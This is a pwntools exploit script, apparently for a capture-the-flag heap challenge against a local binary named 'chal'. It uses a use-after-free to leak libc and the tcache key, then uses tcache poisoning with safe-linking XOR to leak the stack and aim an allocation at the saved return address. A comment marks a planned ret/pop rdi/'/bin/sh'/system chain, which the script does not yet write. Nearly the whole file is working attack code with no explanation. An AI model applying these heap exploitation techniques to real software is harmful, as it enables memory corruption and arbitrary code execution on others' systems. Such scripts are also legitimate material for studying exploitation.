from pwn import *
context.log_level='debug'
#r=process('./chal')
r = gdb.debug('./chal', 'b *db_create+142')
libc=ELF('./lib/libc.so.6')
def create(i,kl,kd,vl,vd):
    r.recvuntil(b'>>> ')
    r.sendline(b'1')
    r.recvuntil(b'>>>')
    r.sendline(str(i).encode())
    r.recvuntil(b'>>> ')
    r.sendline(str(kl).encode())
    r.recvuntil(b'>>>')
    r.sendline(kd)
    r.recvuntil(b'>>>')
    r.sendline(str(vl).encode())
    r.recvuntil(b'>>>')
    r.sendline(vd)
def update(i, data):
    r.recvuntil(b'>>>')
    r.sendline(b'2')
    r.recvuntil(b'>>>')
    r.sendline(str(i).encode())
    r.recvuntil(b'>>>')
    r.sendline(data)
def read(i):
    r.recvuntil(b'>>>')
    r.sendline(b'3')
    r.sendline(str(i).encode())
    r.recvuntil(b'key = ')
    k=eval("b'"+r.recvline(keepends=False).decode()+"'")
    r.recvuntil('val = ')
    v=eval("b'"+r.recvline(keepends=False).decode()+"'")
    return (k, v)
def delete(i):
    r.recvuntil(b'>>>')
    r.sendline(b'4')
    r.recvuntil(b'>>>')
    r.sendline(str(i).encode())
def depart():
    r.recvuntil(b'>>>')
    r.sendline(b'5')
#create(0,0x20,b'',0x20,b'')
create(0,0x410,b'',0x40,b'')
delete(0)
libc_leak, key = read(0)
key = u64(key[:8])
libc_leak = u64(libc_leak[:8])
#unsorted bin->main_arena+96
#tcache chunk->key leak
libc.address = libc_leak - (0x21ac80 + 96)
print('key', hex(key))
print('libc.address', hex(libc.address))
create(0,0x410,b'',0x40,b'') #prevent malloc from cutting out of unsortedbin
create(1, 0x40, b'', 0x40, b'')
create(0,0x40,b'',0x40,b'')
delete(0)
update(0, p64(key^(libc.address+0x2662d0)))
create(0, 0x40, b'', 0x40, b'')
_, stack_leak = read(0)
stack_leak = u64(stack_leak[:8])
# point to stored_rbp so it's aligned
stack_loc = stack_leak - 0x128+0x8-0x10+0x60
delete(1)
update(1, p64(key^stack_loc))
# ret+pop rdi+/bin/sh+system
create(0,0x40,b'',0x40,b'')
print(read(0))
depart()
r.interactive()

